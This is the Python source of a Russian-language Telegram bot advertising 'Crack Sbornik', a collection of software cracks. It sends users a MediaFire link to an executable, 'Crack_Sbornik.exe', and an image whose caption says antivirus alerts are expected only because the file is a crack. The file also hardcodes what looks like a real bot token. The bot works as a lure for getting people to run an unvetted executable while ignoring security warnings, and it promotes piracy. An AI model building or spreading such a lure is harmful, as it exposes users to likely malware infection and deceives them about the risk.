import telebot
from telebot import types
import time

TOKEN = "8294974465:AAFfeR0krjHmDUwdQm7rO5N6VfnV8ZvFrOI"  # ЗАМЕНИТЕ НА СВОЙ ТОКЕН
SOFT_LINK = "https://www.mediafire.com/file/aulm7t7mu6388sc/Crack_Sbornik.exe/file"

# ПРЯМАЯ ССЫЛКА НА ИЗОБРАЖЕНИЕ (замените на свою)
IMAGE_URL = "https://i.ibb.co/vxLfXLY4/gg.png"

bot = telebot.TeleBot(TOKEN)

# Словарь для хранения времени последнего запроса пользователя
user_last_use = {}

# Проверка КД (5 секунд)
def check_cooldown(user_id):
    current_time = time.time()
    if user_id in user_last_use:
        time_passed = current_time - user_last_use[user_id]
        if time_passed < 5:
            return int(5 - time_passed)
    return 0

# Обновление времени последнего действия
def update_cooldown(user_id):
    user_last_use[user_id] = time.time()

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    remaining = check_cooldown(user_id)
    
    if remaining > 0:
        bot.send_message(
            message.chat.id,
            f"⏳ Подожди {remaining} секунд перед повторным использованием /start!"
        )
        return
    
    update_cooldown(user_id)
    
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    button1 = types.InlineKeyboardButton("📥 Скачать софт", callback_data="download")
    button2 = types.InlineKeyboardButton("🎯 Подробнее", callback_data="more")
    keyboard.add(button1, button2)
    
    bot.send_message(message.chat.id, "Crack Sbornik - 💥 лучший сборник кряков именно для тебя!", reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: True)
def callback(call):
    user_id = call.from_user.id
    remaining = check_cooldown(user_id)
    
    if remaining > 0:
        bot.answer_callback_query(
            call.id,
            f"⏳ Подожди {remaining} сек перед следующим запросом!",
            show_alert=False
        )
        return
    
    update_cooldown(user_id)
    
    if call.data == "download":
        bot.send_message(call.message.chat.id, f"🔗 Ссылка для скачивания:\n{SOFT_LINK}")
    
    elif call.data == "more":
        bot.send_photo(
            call.message.chat.id,
            IMAGE_URL,
            caption="☢️ антивирус может ругаться на софт потому что это кряк ☢️"
        )
    
    bot.answer_callback_query(call.id)

print("✅ Бот запущен! КД 5 секунд на /start и кнопки")
bot.infinity_polling()
